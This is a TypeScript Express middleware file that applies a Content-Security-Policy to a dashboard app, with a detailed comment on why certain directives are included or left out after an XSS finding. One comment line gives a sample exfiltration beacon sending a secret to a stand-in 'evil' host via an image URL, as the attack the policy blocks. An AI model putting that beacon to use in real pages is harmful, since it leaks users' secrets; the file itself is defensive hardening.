import type { Request, RequestHandler, Response, NextFunction } from "express";

/**
 * Content-Security-Policy for every companion response.
 *
 * WHY THIS EXISTS: nothing served a CSP before, which is what turned the explain-panel XSS (#281)
 * from a nuisance into a critical finding — an injected inline handler simply ran, in the origin
 * that holds every case, the provider API keys, and the server actions. `public/dashboard.html` is
 * ~16k lines built almost entirely from `innerHTML` string concatenation, so that bug class will
 * recur; a CSP is what makes the next instance survivable rather than severe.
 *
 * ── What this policy deliberately does NOT do ────────────────────────────────────────────────
 * It does not mention `script-src`, `style-src`, or `default-src`. That is not an oversight.
 *
 * The dashboard carries ~80 inline `on*=` handlers, 10 inline `<script>` blocks, and ~1157
 * `style=""` attributes. Any of those three directives — `default-src` included, because the other
 * two fall back to it — would break all of them on the spot. Nor would adding them with
 * `'unsafe-inline'` buy anything: `'unsafe-inline'` is precisely what permits `onerror=` to run, so
 * such a policy would stop nothing. A nonce does not rescue this either — nonces whitelist
 * `<script>` BLOCKS and never inline event handlers, which are unconditionally banned the moment
 * `'unsafe-inline'` is dropped.
 *
 * Blocking injected script therefore requires converting all ~80 handlers to `addEventListener`
 * first. That is a separate change. What is here is the hardening available WITHOUT it, which is
 * real: an injected script still runs, but it cannot phone home.
 *
 * ── The directives ───────────────────────────────────────────────────────────────────────────
 *  - `connect-src 'self'` — the one that carries weight today. The dashboard makes zero
 *    cross-origin fetches (all enrichment is proxied server-side), so confining egress costs
 *    nothing and denies injected script its exfiltration channel: no beaconing case contents,
 *    API keys, or session state to an attacker host. XSS that cannot exfiltrate is far less useful.
 *    `'self'` also covers the same-origin `ws://…/ws` live feed (CSP3 matches ws/wss against the
 *    document's own origin).
 *  - `img-src 'self' data:` — `data:` is required: the dashboard inlines 27 data:image/svg icons.
 *    Pinning it still closes the classic `new Image().src = "https://evil/?" + secret` side channel.
 *  - `object-src 'none'` — `<object>`/`<embed>` are a script-execution path of their own.
 *  - `base-uri 'none'` — stops an injected `<base>` silently re-pointing every relative URL.
 *  - `form-action 'none'` — all five dashboard `<form>`s are `onsubmit="return false"` and never
 *    navigate, so this is free; it stops an injected form POSTing anywhere.
 *  - `frame-ancestors 'none'` — clickjacking. Nothing frames the dashboard.
 *
 * Blob downloads (Sigma drafts, CSV exports) use `a[download]` with `URL.createObjectURL` and are
 * governed by none of the above. The `/mobile` PWA's service worker and web manifest are
 * same-origin, and with no `default-src` present they are unrestricted here.
 */
export const CSP_POLICY = [
  "img-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
  "frame-ancestors 'none'",
].join("; ");

/**
 * Express middleware stamping {@link CSP_POLICY} on every response.
 *
 * Applied to API responses as well as documents. A JSON body is not a script host, but a uniform
 * header costs nothing and leaves no route whose response an attacker can steer into a document
 * context without the policy attached.
 */
export function createSecurityHeaders(): RequestHandler {
  return (_req: Request, res: Response, next: NextFunction): void => {
    res.setHeader("Content-Security-Policy", CSP_POLICY);
    next();
  };
}
